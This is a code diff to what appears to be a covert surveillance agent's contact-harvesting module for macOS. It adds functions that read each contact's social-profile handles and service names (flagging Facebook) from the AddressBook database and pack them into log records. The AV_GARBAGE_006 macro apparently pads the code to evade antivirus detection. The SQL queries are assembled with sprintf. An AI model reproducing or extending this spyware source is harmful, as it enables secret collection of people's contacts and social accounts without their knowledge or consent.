@@ -48,6 +48,9 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
 //
 - (BOOL)_logData: (NSMutableData *)aLogData;
 
+//
+// Manage markups, based on modification date
+//
 - (void) _getMarkup;
 - (void) _setMarkup;
 
@@ -490,6 +493,99 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
     return mailData;
 }
 
+- (NSData*)_getSocialWithId:(NSInteger)theId usingDb:(sqlite3*)db
+{
+    NSMutableData *socialData = nil;
+    
+    char          sql_query_curr[1024];
+    int           ret, nrow = 0, ncol = 0;
+    char          *szErr;
+    char          **result;
+    char          sql_query_all[] = "select ZUSERIDENTIFIER from ZABCDSOCIALPROFILE";
+    
+    sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all, theId);
+    
+    ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+    
+    if (ret != SQLITE_OK)
+    {
+        return nil;
+    }
+    if (ncol * nrow > 0)
+    {
+        socialData = [NSMutableData dataWithCapacity:0];
+        
+        for (int i = 0; i< nrow * ncol; i += 1)
+        {
+            NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+            
+            if (result[ncol + i] != NULL)
+            {
+                NSString *handleId     = [NSString stringWithUTF8String: result[ncol + i]];
+                NSData *_handleIdData  = [handleId dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+                
+                NSData *serializedHandleData = [self _serializeSingleRecordData: _handleIdData
+                                                                      withType: SocialHandle];
+                [socialData appendData: serializedHandleData];
+            }
+            
+            [inner release];
+        }
+        
+        sqlite3_free_table(result);
+    }
+    
+    return socialData;
+}
+
+- (NSInteger)_getServiceWithId:(NSInteger)theId usingDb:(sqlite3*)db
+{
+    NSInteger service = 0x11;  // default contacts
+    NSMutableData *serviceData = nil;
+    
+    char          sql_query_curr[1024];
+    int           ret, nrow = 0, ncol = 0;
+    char          *szErr;
+    char          **result;
+    char          sql_query_all[] = "select ZSERVICENAME from ZABCDSOCIALPROFILE";
+    
+    sprintf(sql_query_curr, "%s where ZOWNER = %d", sql_query_all, theId);
+    
+    ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+    
+    if (ret != SQLITE_OK)
+    {
+        return service;
+    }
+    if (ncol * nrow > 0)
+    {
+        serviceData = [NSMutableData dataWithCapacity:0];
+        
+        for (int i = 0; i< nrow * ncol; i += 1)
+        {
+            NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
+            
+            if (result[ncol + i] != NULL)
+            {
+                NSString *serviceName     = [NSString stringWithUTF8String: result[ncol + i]];
+                if ([serviceName compare:@"Facebook"] == NSOrderedSame)
+                {
+#ifdef DEBUG_ORGANIZER
+                    infoLog(@"Facebook");
+#endif
+                    service = 0x03;
+                }
+            }
+            
+            [inner release];
+        }
+        
+        sqlite3_free_table(result);
+    }
+    
+    return service;
+}
+
 - (const char*)getDBPath
 {
   NSString *myPath = [NSString stringWithFormat:@"%@/../../Application Support/AddressBook/AddressBook-v22.abcddb",
@@ -498,7 +594,7 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
   return [myPath cStringUsingEncoding:NSUTF8StringEncoding];
 }
 
-- (NSData*)createLogHeaderWithSize:(NSInteger)logSize markLocal:(BOOL) local
+- (NSData*)createLogHeaderWithSize:(NSInteger)logSize withProgram:(NSInteger)program markLocal:(BOOL) local
 {
     NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
     
@@ -517,7 +613,7 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
     AV_GARBAGE_006
     
     additionalHeader->identifier  = 0;
-    additionalHeader->program     = 0x11; //new OS X Contacts id //0x01; // phone contact
+    additionalHeader->program     = program;
     if(local == YES)
     {
         additionalHeader->flags       = 0x80000000; // (local = 0x80000000)
@@ -662,17 +758,22 @@ static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
                 if (first != nil || last != nil)
                 {
                     NSData *serializedPhoneData = [self _getPhoneWithId:z_pk usingDb:db];
-                
                     if (serializedPhoneData != nil)
                         [contentLog appendData: serializedPhoneData];
                 
                     NSData *serializedMailData  = [self _getMailWithId:z_pk usingDb:db];
-                
                     if (serializedMailData != nil)
                         [contentLog appendData: serializedMailData];
+                    
+                    NSData *serializedSocialData = [self _getSocialWithId:z_pk usingDb:db];
+                    if (serializedSocialData != nil)
+                        [contentLog appendData: serializedSocialData];
+                    
+                    NSInteger service = [self _getServiceWithId:z_pk usingDb:db];
+                    
                     if([contentLog length] >0)
                     {
-                        NSData *headerData = [self createLogHeaderWithSize:[contentLog length] markLocal:local];
+                        NSData *headerData = [self createLogHeaderWithSize:[contentLog length] withProgram:service markLocal:local];
                         [logData appendData: headerData];
                         [logData appendData: contentLog];
                     }
